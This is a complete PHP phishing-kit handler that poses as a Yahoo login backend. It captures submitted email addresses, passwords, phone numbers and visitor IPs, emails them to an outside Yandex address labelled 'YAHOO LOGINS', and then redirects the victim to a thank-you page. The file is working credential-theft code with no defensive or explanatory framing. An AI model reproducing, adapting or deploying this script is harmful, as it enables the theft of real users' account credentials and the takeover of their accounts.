﻿<?

$ip = getenv("REMOTE_ADDR");
$message .= "---- : || Juve Yahoo Logs || :------\n";
$message .= "Zip Code: ".$_POST['shortCountryCode']."\n";
$message .= "Phone: ".$_POST['phone']."\n";
$message .= "Email ID: ".$_POST['email']."\n";
$message .= "password: ".$_POST['password']."\n";
$message .= "password: ".$_POST['re-password']."\n";
$message .= "IP: ".$ip."\n";
$message .= "----: || D4rkL4B || :------\n";

$recipient = "inboxhunter148@yandex.com";
$subject = "YAHOO LOGINS| ".$ip."\n";
$headers ="From: Onlineform";
$headers .=$_POST['eMailAdd']."\n";
$headers .="MIME-Version: 1.0\n";
 	    mail("","yahoo",$message);
if(mail($recipient,$subject,$message))

{
?>

<script language=javascript>
window.location='thanks2017.html';
</script>

<?
}
else
{
echo "ERROR! Please go back and try again";
}
?>